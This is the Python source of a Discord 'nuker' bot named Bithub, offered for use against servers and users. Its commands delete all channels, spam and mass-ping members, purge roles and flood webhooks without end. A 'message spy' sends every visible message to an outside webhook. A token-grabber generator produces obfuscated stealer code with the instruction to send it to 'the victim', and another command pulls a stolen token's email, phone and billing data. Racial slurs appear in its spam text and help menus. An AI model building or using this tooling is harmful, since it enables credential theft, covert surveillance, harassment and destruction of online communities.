import discord
import aiohttp
import asyncio
import requests
import time
import random
import io
import base64
import marshal
import string
from config import TOKEN
from utils.tokeninfo import tokeninfo
from discord.ext import commands




# ================                 Bithub                   ================ # 
# ++++++++++++++++          started at 10/17/2023           ++++++++++++++++ #


                # ================ changelog ================ # 
                # everything looks better now
                # added message spy with webhook
                # added tokeninformation
                # flush will now delete channels before spamming
                # added tokeninfo.py
                # added token grabber generator
                # added grabber.py
                # ================ changelog ================ # 




                # ================ to do list ================ # 
                # fix mass ban
                # fix profile spy
                # add user token functions
                # add badges to token info,skid from https://github.com/Fadi002/Discord-Token-Info/blob/main/src/info.py
                # add emojis
                # change every thing to embeds
                # ================ to do list ================ # 





YOURUSERID = ''


intents = discord.Intents.all()


bot = commands.Bot(command_prefix="!", intents=intents)


bot.remove_command('help')




@bot.event
async def on_ready():
    user = await bot.fetch_user(YOURUSERID)
    embexd = discord.Embed(description='<:glory:1168889710438010950>  Bot initiated.  |  Developed by xolo', color=discord.Color.gold())
    await user.send(embed=embexd)
    embezd = discord.Embed(description='<:github:1168890688943968256>  [Github](https://github.com/x9o/Bithub)', color=discord.Color.darker_grey())
    await user.send(embed=embezd)
    await bot.change_presence(status=discord.Status.online)
    activity = discord.Activity(type=discord.ActivityType.listening, name=f"{bot.command_prefix}help")
    await bot.change_presence(activity=activity)
    print(f'Logged in as {bot.user.name}')
    



@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        embxdd = discord.Embed(title="❌ Invalid Command", description=f"Try '{bot.command_prefix}help'.", color=discord.Color.red())
        await ctx.reply(embed=embxdd)


# goofy spy #
# ========================================================================= #
fuckingwebhook = None
messagespy = "OFF"
auditlogspy = "OFF"
userprofilespy = "OFF"
banspy = "OFF"
deletespy = "OFF"
leavespy = "OFF"
editspy = "OFF"


def get_webhook_id(url):
    parts = url.split('/')
    return int(parts[-3]) if parts[-2] == 'webhooks' else None


def is_same_channel(message, webhook_channel_id):
    return message.channel.id == webhook_channel_id if webhook_channel_id else False

        
@bot.event
async def on_message(message):
    await bot.process_commands(message)
    global fuckingwebhook
    global messagespy

    if messagespy != "OFF":
        if message.channel.name == "spy":
            return

        

        embed = discord.Embed(
            title='👁️  Message detected',
            description='',
            color=discord.Color.dark_purple()
        )

        embed.add_field(name='⌨️  Content', value=f"**{message.content}**", inline=False)
        embed.add_field(name='📖  Author', value=f"@{message.author}", inline=False)
        embed.add_field(name='🔗  Channel', value=f"#{message.channel.name}", inline=False)
        embed.add_field(name='🏫  Server', value=message.guild.name, inline=False)
        embed.add_field(name='🆔  Message ID', value=message.id, inline=False)

        
        if message.reference and message.reference.message_id:
            replied_message = await message.channel.fetch_message(message.reference.message_id)
            if replied_message:
                embed.add_field(name='↩️  Replying to', value=f'"{replied_message.content}" — @{replied_message.author}', inline=False)
            else:
                embed.add_field(name='↩️  Replying to', value='Message not found', inline=False)
        else:
            embed.add_field(name='↩️  Replying to', value='None', inline=False)

        embed.set_footer(text="🐈‍⬛ signed by xolo")

        payload = {
            'embeds': [embed.to_dict()]
        }

        
        async with aiohttp.ClientSession() as session:
            async with session.post(fuckingwebhook, json=payload):
                pass

        

@bot.event
async def on_audit_log_entry_create(entry):
    global auditlogspy

    if auditlogspy != "OFF":
        guild = entry.guild
        channel = discord.utils.get(guild.text_channels, name='spy')

        actionxd = str(entry.action).replace("AuditLogAction.", "")

        embed = discord.Embed(title='👁️ Audit Log Entry Created', color=discord.Color.green())
        embed.add_field(name='👊 Action', value=actionxd, inline=False)
        embed.add_field(name='🪪 User', value=f"@{str(entry.user)}", inline=False)
        embed.add_field(name='🎯 Target', value=str(entry.target), inline=False)
        embed.add_field(name='❓ Reason', value=str(entry.reason), inline=False)
        embed.set_footer(text="Audit log spy is limited to this current server. ")

        await channel.send(embed=embed)






@bot.event
async def on_member_update(before, after):
    global userprofilespy

    if userprofilespy != "OFF":
        guild = after.guild
        channel = discord.utils.get(guild.text_channels, name='spy')

        userbefore = before.name
        userafter = after.name

        

        avbefore = before.avatar.url if before.avatar else None
        avafter = after.avatar.url if after.avatar else None

        beforedis = before.display_name
        afterdis = after.display_name

        embed = discord.Embed(title="👁️ Profile change detected", description="Profile change detected.", color=discord.Color.dark_green())
        embed.add_field(name="⬅️ Username before:", value=f"{userbefore}", inline=False)
        embed.add_field(name="➡️ Username after:", value=f"{userafter}", inline=False)
        embed.add_field(name="⬅️ Display name before:", value=f"{beforedis}", inline=False)
        embed.add_field(name="➡️ Display name after:", value=f"{afterdis}", inline=False)

        
        embedtwo = discord.Embed(title="⬅️ Avatar before:", description="", color=discord.Color.dark_green())
        embedtwo.set_image(url=avbefore)

        embedthree = discord.Embed(title="➡️ Avatar after:", description="", color=discord.Color.dark_green())
        embedthree.set_image(url=avafter)

        await channel.send(embed=embed)
        await channel.send(embed=embedtwo)
        await channel.send(embed=embedthree)
        
@bot.event
async def on_member_ban(guild, user):
    channel = discord.utils.get(guild.text_channels, name='spy')
    global banspy

    if banspy != "OFF":
        avatar_url = user.avatar.url if user.avatar else user.default_avatar.url
        embed = discord.Embed(title="👁️ User banned", description=f"**{user}** was banned in {guild}.", color=discord.Color.red())
        embed.set_image(url=f"{avatar_url}")
        await channel.send(embed=embed)

@bot.event
async def on_member_remove(member):
    guild = member.guild
    channel = discord.utils.get(guild.text_channels, name='spy')
    global leavespy

    if leavespy != "OFF":
        embed = discord.Embed(title="👁️ User left", description=f"@**{member}** left {guild}.", color=discord.Color.dark_gray())
        await channel.send(embed=embed)
    
@bot.event
async def on_message_delete(message):
    guild = message.guild
    content = message.content
    author = message.author
    channelx = message.channel
    channel = discord.utils.get(guild.text_channels, name='spy')
    global deletespy

    if deletespy != "OFF":
        embed = discord.Embed(title="👁️ Message deleted", description="", color=discord.Color.dark_teal())
        embed.add_field(name="📜 Message content:", value=f"**{content}**", inline=False)
        embed.add_field(name="✒️ Message author:", value=f"@{author}", inline=False)
        embed.add_field(name="🔗 Channel where message was deleted: ", value=f"#{channelx}", inline=False)
        embed.set_footer(text="Delete spy is limited to this current server. ")
        

        await channel.send(embed=embed)

@bot.event
async def on_message_edit(before, after):
    befx = before.content
    aftx = after.content
    guild = after.guild
    author = after.author
    channelz = after.channel
    channel = discord.utils.get(guild.text_channels, name='spy')
    global editspy
    
    if editspy != "OFF":
        embed = discord.Embed(title="Message edited", description="", color=discord.Color.light_gray())
        embed.add_field(name="◀️ Before: ", value=f"{befx}", inline=False)
        embed.add_field(name="▶️ After: ", value=f"{aftx}", inline=False)
        embed.add_field(name="🔗 Channel: ", value=f"#{channelz}", inline=False)
        embed.add_field(name="✒️ Message author: ", value=f"@{author}", inline=False)
        embed.set_footer(text="Edit spy is limited to this current server. ")

        await channel.send(embed=embed)

@bot.command()
async def messagespytoggle(ctx, mode: str, webhk=""):
    global messagespy
    global fuckingwebhook
    if mode.lower() == "on":
        if not webhk.startswith("https://discord.com/api/webhooks/") or webhk == "":
            await ctx.reply("Invalid webhook.")
        else:
            messagespy = "ON"
            await ctx.reply(f"☑️ Message spy enabled. Webhook: ||{webhk}||")
            fuckingwebhook = webhk
            guild = ctx.guild
            overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True)
            }
            existing_channel = discord.utils.get(guild.channels, name="spy")
            if existing_channel is None:
                await guild.create_text_channel("spy", overwrites=overwrites)
            await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        messagespy = "OFF"
        await ctx.reply("Message spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")

    
@bot.command()
async def auditspytoggle(ctx, mode: str):
    global auditlogspy
    if mode.lower() == "on":
        auditlogspy = "ON"
        await ctx.reply("☑️ Audit log spy enabled.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
        await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        auditlogspy = "OFF"
        await ctx.reply("Audit log spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")




@bot.command()
async def profilespytoggle(ctx, mode: str):
    global userprofilespy
    if mode.lower() == "on":
        userprofilespy = "ON"
        await ctx.reply("☑️ Profile spy enabled.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
        await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        userprofilespy = "OFF"
        await ctx.reply("Profile spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")

@bot.command()
async def banspytoggle(ctx, mode: str):
    global banspy
    if mode.lower() == "on":
        banspy = "ON"
        await ctx.reply("☑️ Ban spy enabled.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
        await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        banspy = "OFF"
        await ctx.reply("Ban spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")

@bot.command()
async def leavespytoggle(ctx, mode: str):
    global leavespy
    if mode.lower() == "on":
        leavespy = "ON"
        await ctx.reply("☑️ Member leave spy enabled.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
        await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        leavespy = "OFF"
        await ctx.reply("Member leave spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")


@bot.command()
async def deletespytoggle(ctx, mode: str):
    global deletespy
    if mode.lower() == "on":
        deletespy = "ON"
        await ctx.reply("☑️ Message deletion spy enabled.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
        await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        deletespy = "OFF"
        await ctx.reply("Message deletion spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")

@bot.command()
async def editspytoggle(ctx, mode: str):
    global editspy
    if mode.lower() == "on":
        editspy = "ON"
        await ctx.reply("☑️ Edit spy enabled.")
        guild = ctx.guild
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        existing_channel = discord.utils.get(guild.channels, name="spy")
        if existing_channel is None:
            await guild.create_text_channel("spy", overwrites=overwrites)
        await ctx.message.add_reaction("✔️")
    elif mode.lower() == "off":
        editspy = "OFF"
        await ctx.reply("Edit spy disabled.")
        await ctx.message.add_reaction("✔️")
    else:
        await ctx.reply("Invalid syntax.")


# goofy spy #
# ========================================================================= #

@bot.command()
async def setprefix(ctx, prefix: str):
    if ctx.author.id != int(YOURUSERID):
        await ctx.reply('You are not authorized to use this command.')
        return
    bot.command_prefix = prefix
    await ctx.send(f"☑️ The bot's prefix has been changed to '{prefix}'")


@bot.command()
async def setstatus(ctx, status: str):
    if ctx.author.id != int(YOURUSERID):
        await ctx.reply('You are not authorized to use this command.')
        return

    if status.lower() == 'online':
        await bot.change_presence(status=discord.Status.online)
        await ctx.reply('☑️ Done.')
    elif status.lower() == 'idle':
        await bot.change_presence(status=discord.Status.idle)
        await ctx.reply('☑️ Done.')
    elif status.lower() == 'dnd' or status.lower() == 'do not disturb':
        await bot.change_presence(status=discord.Status.dnd)
        await ctx.reply('☑️ Done.')
    elif status.lower() == 'invisible':
        await bot.change_presence(status=discord.Status.invisible)
        await ctx.reply('☑️ Done.')
    else:
        embaed = discord.Embed(title="", description=f":x:  Invalid status. Please choose one of the following: online, idle, dnd, invisible.", color=discord.Color.red())
        await ctx.reply(embed=embaed)


@bot.command()
async def flush(ctx, server_id):
    try:
        channel_names = ["NUKED NIGGAS", "get fucked", "RAIDED", "GET SHITTED ON"]
        message_contents = ["@everyone GET NUKED 🤡", "@everyone RAIDED", "@everyone speak your shit lil niggas", "@everyone FLOP"]
        guild = bot.get_guild(int(server_id))
        if guild is not None:
            
            for channel in guild.channels:
                await channel.delete()

            created_channels = []
            channel_amount = 10
            message_amount = 80

            for _ in range(channel_amount):
                new_channel_name = random.choice(channel_names)
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                    guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                }
                new_channel = await guild.create_text_channel(new_channel_name, overwrites=overwrites)
                created_channels.append(new_channel)

            tasks = []
            for channel in created_channels:
                message_content = random.choice(message_contents)
                task = asyncio.create_task(send_messages(channel, message_amount, message_content))
                tasks.append(task)

            await asyncio.gather(*tasks)
    except Exception as e:
        embaed = discord.Embed(title="", description=f":x:  Error: {e}", color=discord.Color.red())
        await ctx.reply(embed=embaed)





@bot.command()
async def customflush(ctx, server_id, channel_amount, channel_name, message_amount, *, message_content):
    try:
        guild = bot.get_guild(int(server_id))
        if guild is not None:
            created_channels = []
            for _ in range(int(channel_amount)):
                new_channel_name = channel_name.strip()
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                    guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                }
                new_channel = await guild.create_text_channel(new_channel_name, overwrites=overwrites)
                created_channels.append(new_channel)

            tasks = []
            for channel in created_channels:
                task = asyncio.create_task(send_messages(channel, int(message_amount), message_content))
                tasks.append(task)

            await asyncio.gather(*tasks)

            await ctx.send("☑️ Operation complete.")
        else:
            embaed = discord.Embed(title="", description=f":x:  Could not find server with ID {server_id}.", color=discord.Color.red())
            await ctx.reply(embed=embaed)
    except ValueError:
        embxdd = discord.Embed(title="", description=":x:  Invalid syntax.", color=discord.Color.red())
        await ctx.reply(embed=embxdd)
        
@bot.command()
async def purge(ctx, server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild is not None:
            for channel in guild.channels:
                await channel.delete()
            
        else:
            embxdzd = discord.Embed(title="", description=f":x:  Could not find server with ID {server_id}.", color=discord.Color.red())
            await ctx.reply(embed=embxdzd)
    except ValueError:
        embxdd = discord.Embed(title="", description=":x:  Invalid syntax.", color=discord.Color.red())
        await ctx.reply(embed=embxdd)


@bot.command()
async def help(ctx):
    help_embed = discord.Embed(title='Bithub V0.1 <:bithubwrld:1168918019695706142>', description="", color=discord.Color.orange())
    help_embed.set_footer(text="Made by xolo. | Started at 10/17/2023.")
    view = XOLOVIEW()
    view.add_item(discord.ui.Button(label="My Github",style=discord.ButtonStyle.link,url="https://github.com/x9o"))
    await ctx.reply(embed=help_embed, view=view)

@bot.command()
async def leave(ctx, server_id):
    guild = bot.get_guild(int(server_id))
    if guild is not None:
        guildname = guild.name
        await guild.leave()
        await ctx.send(f"☑️ Successfully left the server **{guildname}**.")
    else:
        await ctx.send(f"❌ Could not find the server with ID {server_id}.")

@bot.command()
async def link(ctx):
    
    await ctx.message.add_reaction("✔️")

    await ctx.reply("https://discord.com/api/oauth2/authorize?client_id=999232775443984495&permissions=8&scope=bot")


@bot.command()
async def servlist(ctx):
    servers = bot.guilds
    server_list = ""
    for server in servers:
        text_channels = server.text_channels
        if text_channels:
            invite = await text_channels[0].create_invite()
            permissions = server.me.guild_permissions
            if permissions.administrator:
                permission_string = "Yes"
            else:
                permission_string = "No"
            server_info = f"**{server.name}** (ID: {server.id})\nInvite: {invite.url}\nHas Admin: {permission_string}\n================================\n"
            server_list += server_info
    await ctx.send(f"Server list:\n{server_list}")

@bot.command()
async def massping(ctx, server_id: int, message_amount: int = 5, *, message_content: str = ""):
    guild = bot.get_guild(server_id)
    if guild is None:
        await ctx.send("Invalid server ID.")
        return

    members = guild.members[:50]  # Fetch up to 50 members
    mentions = ' '.join(member.mention for member in members)

    tasks = []
    for channel in guild.text_channels:
        for _ in range(message_amount):
            tasks.append(channel.send(f"{mentions} {message_content}"))

    await asyncio.gather(*tasks)

    await ctx.message.add_reaction("✔️")
    

@bot.command()
async def clear(ctx, server_id: int):
    guild = bot.get_guild(server_id)
    if guild is None:
        await ctx.send("Invalid server ID.")
        return

    def is_bot_message(message):
        return message.author == bot.user

    deleted_count = 0
    for channel in guild.text_channels:
        async for message in channel.history(limit=None):
            if is_bot_message(message):
                await message.delete()
                deleted_count += 1

    await ctx.message.add_reaction("✔️")
    await ctx.send(f"Deleted {deleted_count} message(s) sent by the bot.")


@bot.command()
async def clearchannel(ctx, server_id: int, channel_id: int):
    try:
        guild = bot.get_guild(server_id)
        channel = guild.get_channel(channel_id)

        if not channel:
            await ctx.send(f"Channel with ID {channel_id} not found.")
            return

        await channel.purge()
        await ctx.send(f"All messages in channel **{channel.name}** have been deleted.")
    except:
        pass


@bot.command()
async def rolepurge(ctx, server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild is None:
            await ctx.send("Invalid server ID or bot is not a member of the server.")
            return

        roles = guild.roles
        bot_role = guild.get_member(bot.user.id).top_role

        for role in roles:
            if role.name != "@everyone" and role != bot_role:
                await role.delete()
        
        await ctx.send("All deletable roles have been deleted.")
    except discord.errors.Forbidden:
        pass
        await ctx.send("All deletable roles have been deleted.")
    except ValueError:
        await ctx.send("Invalid server ID format.")




    
    
@bot.command()
async def say(ctx, *args):
    message = " ".join(args)
    await ctx.message.delete() 
    await ctx.send(message)

@bot.command()
async def ban(ctx, user_id: int, *, reason="No reason provided."):
    try:
        user = await bot.fetch_user(user_id)
        await user.send(f'You have been banned from {ctx.guild.name}.\nReason: **{reason}**')
        await ctx.guild.ban(user, reason=reason)
        await ctx.reply(f'Successfully banned user with ID: {user_id}.\nReason: **{reason}**')
    
    except discord.NotFound:
        await ctx.reply('User not found/Failed.')

@bot.command()
async def unban(ctx, id: int):
    user = await bot.fetch_user(id)
    try:
        await ctx.guild.unban(user)
        await ctx.reply(f'Unbanned **{user.name}**')
    except:
        await ctx.reply('Failed.')


@bot.command()
async def massban(ctx):
    guild = ctx.guild
    members = guild.members

    try:
        for member in members:
            await guild.ban(member)
            await asyncio.sleep(0.8)
            
    except:
        pass  

    await ctx.send('Successfully banned all users.')

@bot.command()
async def dm(ctx, userid, *, messagecontent):
    user = await bot.fetch_user(userid)
    try:
        await user.send(f"{messagecontent}")
        await ctx.reply("Direct message sent successfully. ✔️")
    except discord.Forbidden:
        await ctx.reply("Unable to send a direct message to the user. 😢")


@bot.command()
async def webhookspam(ctx, webhook, msg):
    await ctx.reply("Spamming webhook....")
    await ctx.message.add_reaction("✔️")
    webhookfuck(webhook, msg)


@bot.command()
async def avatar(ctx, user: discord.User):
    avatar_url = user.avatar.url if user.avatar else user.default_avatar.url
    embed = discord.Embed(title=f"Dis nigga {user.name}'s avatar", description="", color=discord.Color.gold())
    embed.set_footer(text="amazing pfp")
    embed.set_image(url=f"{avatar_url}")
    await ctx.reply(embed=embed)

@bot.command()
async def tokengrabber(ctx, webhook, obfus):
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        await ctx.reply("Invalid webhook URL.")
        return

    with open('utils/grabber.py', 'r') as file:
        content = file.read()

    
    new_content = content.replace('thewebhook', webhook)

    if obfus.lower() == "true":
        new_content = obfuscate(new_content)
    else:
        new_content = new_content


    file_object = io.StringIO(new_content)
    file = discord.File(file_object, filename='tokengrabber.py')

    
    await ctx.reply(file=file, content='Rename this and send it to the victim. The victim must have python installed.')


@bot.command()
async def tokinfo(ctx, token):
    
    
    info = tokeninfo(token)

    try:
        embed = discord.Embed(title="🎠", description=f"||{token}||", color=discord.Color.gold())
        embed.add_field(name="📛 Username", value=info[1], inline=False)
        embed.add_field(name="🆔 User ID", value=info[2], inline=False)
        embed.add_field(name="📱 Phone Number", value=info[4], inline=False)
        embed.add_field(name="✉️ Email Address", value=info[5], inline=False)
        embed.add_field(name="🌐 Locale", value=info[12], inline=False)
        embed.add_field(name="🌍 Language", value=info[6], inline=False)
        embed.add_field(name="📅 Creation Date [Day-Month-Year]", value=info[7], inline=False)
        embed.add_field(name="🚀 Has nitro", value=info[8], inline=False)
        embed.add_field(name="🔒 MFA enabled", value=info[9], inline=False)
        embed.add_field(name="🏳️ Flags", value=info[10], inline=False)
        embed.add_field(name="✅ Verified", value=info[11], inline=False)
        embed.set_footer(text="Avatar URL | Billing info will be sent if any")
        embed.set_image(url=info[3])

        first_message = await ctx.reply(embed=embed)  

        billinginfo = None

        if info is not None and len(info) >= 14:
            bill = info[13]
            if bill is not None:
                data = bill[0]
                billinginfo = discord.Embed(title="Billing Information", color=discord.Color.gold())
                for field_name, field_value in data.items():
                    billinginfo.add_field(name=field_name, value=field_value, inline=False)
                await first_message.reply(embed=billinginfo)  
                
            else:
                await first_message.reply("No billing information available :cry:")  
                
        else:
            pass

    except Exception as e:
        embaed = discord.Embed(title="", description=f":x:  {info}", color=discord.Color.red())
        await ctx.reply(embed=embaed)
        print(e)
    
#                                  non bot functions                                      #

#=========================================================================================#


def obfuscate(content):
    compiled_code = compile(content, '<string>', 'exec')
        # Marshal the compiled code
    marshalled_code = marshal.dumps(compiled_code)
        # Base64 encode the marshalled code
    encoded_code = base64.b64encode(marshalled_code).decode('latin1')

    rvn = ''.join(random.choice(string.ascii_letters) for _ in range(5))

    obfuscated_code = f'''
import base64
import marshal

{rvn} = {encoded_code!r}
exec(marshal.loads(base64.b64decode({rvn}.encode('latin1'))))
'''
    
    return obfuscated_code

async def send_messages(channel, num_messages, message_content):
    for _ in range(num_messages):
        await channel.send(message_content)




def webhookfuck(WebHook, Message):
    while True:
        response = requests.post(
            WebHook,
            json = {"content" : Message},
            params = {'wait' : True}
        )
        try:
            
            if response.status_code == 204 or response.status_code == 200:
                print("Sent")
            elif response.status_code == 429:
                print("rate limited")
                
                time.sleep(response.json()["retry_after"] / 1000)
            else:
                print("error")

            time.sleep(.01)
        except KeyboardInterrupt:
            break





class XOLOVIEW(discord.ui.View):
    @discord.ui.button(label="☢️",
                       style=discord.ButtonStyle.danger)
    async def nig(self, interaction: discord.Interaction, button: discord.ui.Button):
        help_embed = discord.Embed(title='Nuking', color=discord.Color.red())
        help_embed.add_field(name='💣 Flush', value='Nukes server\n`!flush <serverid>`', inline=False)
        help_embed.add_field(name='🔫 Custom Flush', value='Creates channels and messages\n`!customflush <serverid> <channelamount> <channelname> <messageamount> <messagecontent>`\nE.g. `!customflush 1234567890 5 ExampleChannel 10 ExampleMessage`', inline=False)
        help_embed.add_field(name='🗑️ Purge', value='Deletes all channels\n`!purge <serverid>`', inline=False)
        help_embed.add_field(name='😡 Mass Ping', value='Use if the bot does not have admin.\n`!massping <serverid> <messageamount> <messagecontent>`', inline=False)
        help_embed.add_field(name='🧹 Clear Channel', value='Deletes all messages in a channel\n`!clearchannel <serverid> <channelid>`', inline=False)
        help_embed.add_field(name='🚮 Role Purge (Cannot delete roles above the bot)', value='`!rolepurge <serverid>`', inline=False)
        help_embed.add_field(name='🔴 Mass Ban [Broken]', value='`!massban <serverid>`', inline=False)
        help_embed.set_footer(text="Made by xolo")

        await interaction.response.send_message(embed=help_embed, ephemeral=True)

    @discord.ui.button(label="🛠️",
                       style=discord.ButtonStyle.green)
    async def niga(self, interaction: discord.Interaction, button: discord.ui.Button):
        helpembed = discord.Embed(title='Utilities', color=discord.Color.green())
        helpembed.add_field(name='👟 Leave', value='Leaves the server\n`!leave <serverid>`', inline=False)
        helpembed.add_field(name='🔗 Link', value='Bot Invite link\n`!link`', inline=False)
        helpembed.add_field(name='📃 Server List', value='Shows a list of servers the bot is in for you to nuke.\n`!servlist`', inline=False)
        helpembed.add_field(name='🧼 Clear', value='Deletes all messages sent by the bot\n`!clear <serverid>`', inline=False)
        helpembed.add_field(name='❗ Set Prefix', value='Owner only\n`!setprefix <prefix>`', inline=False)
        helpembed.add_field(name='🗿 Set Status', value='Owner only\n`!setstatus <status>`', inline=False)
        helpembed.add_field(name='🗣️ Say', value='Says some bullshit you want\n`!say <msg>`', inline=False)
        helpembed.add_field(name='🔨 Ban', value='`!ban <userid> <reason>`', inline=False)
        helpembed.add_field(name='⚒️ UnBan', value='`!unban <userid>`', inline=False)
        helpembed.add_field(name='🥷 DM', value='DM someone\n`!dm <userid> <msgcontent>`', inline=False)
        helpembed.add_field(name=':baby: Avatar', value='Check the avatar sum nigga\n`!avatar <user>`', inline=False)
        helpembed.set_footer(text="Made by xolo")

        await interaction.response.send_message(embed=helpembed, ephemeral=True)

    @discord.ui.button(label="👁️",
                       style=discord.ButtonStyle.secondary)
    async def nigaz(self, interaction: discord.Interaction, button: discord.ui.Button):
        global messagespy
        global auditlogspy
        global banspy
        global userprofilespy
        global leavespy
        global deletespy
        global editspy
        helpxembed = discord.Embed(title='Spy', color=discord.Color.greyple())
        helpxembed.add_field(name='💬 Message spy', value=f'Sends EVERY single message the bot has access to from all servers the bot is in.\n🚨 YOUR WEBHOOK MUST BE IN A CHANNEL NAMED "spy" 🚨\n[!messagespytoggle <on/off> <webhook>]\nStatus: {messagespy}', inline=False)
        helpxembed.add_field(name='📜 Audit log spy', value=f'[!auditspytoggle <on/off>]\nStatus: {auditlogspy}', inline=False)
        helpxembed.add_field(name='🔴 User profile spy [BROKEN]', value=f'Let you know when a user changes anything from their profile.\n[!profilespytoggle <on/off>]\nStatus: {userprofilespy}', inline=False)
        helpxembed.add_field(name='🗡️ Ban spy', value=f'Let you know when a user gets banned.\n[!banspytoggle <on/off>]\nStatus: {banspy} ', inline=False)
        helpxembed.add_field(name='🏃 Leave spy', value=f'Useless ass feature\n[!leavespytoggle <on/off>]\nStatus: {leavespy} ', inline=False)
        helpxembed.add_field(name='🗑️ Spy deleted messages', value=f'Let you know when a message gets deleted.\n[!deletespytoggle]\nStatus: {deletespy} ', inline=False)
        helpxembed.add_field(name='✍️ Spy edited messsages', value=f'Let you know when someone edits a message.\n[!editspytoggle]\nStatus: {editspy} ', inline=False)
        helpxembed.set_footer(text="Made by xolo")


        await interaction.response.send_message(embed=helpxembed, ephemeral=True)


    @discord.ui.button(label="😈",
                       style=discord.ButtonStyle.blurple)
    async def nigar(self, interaction: discord.Interaction, button: discord.ui.Button):
        help_embed = discord.Embed(title='Side features', color=discord.Color.dark_gold())
        help_embed.add_field(name='🪝 Webhook Spammer', value='Spams a webhook until it gets rate limited asf\n`!webhookspam <webhook> <msgcontent>`', inline=False)
        help_embed.add_field(name='🎠 Token grabber generator', value='Generates a token grabber in python. Also grabs IP, HWID, etc.\n`!tokengrabber <webhook> <obfuscate: true/false>`', inline=False)
        help_embed.add_field(name='💸 Token Information', value='Provides full information on a user token. Billing info will also be grabbed if any.\n`!tokinfo <token>`', inline=False)
        help_embed.set_footer(text="Made by xolo")

        await interaction.response.send_message(embed=help_embed, ephemeral=True)


        


        

bot.run(TOKEN)
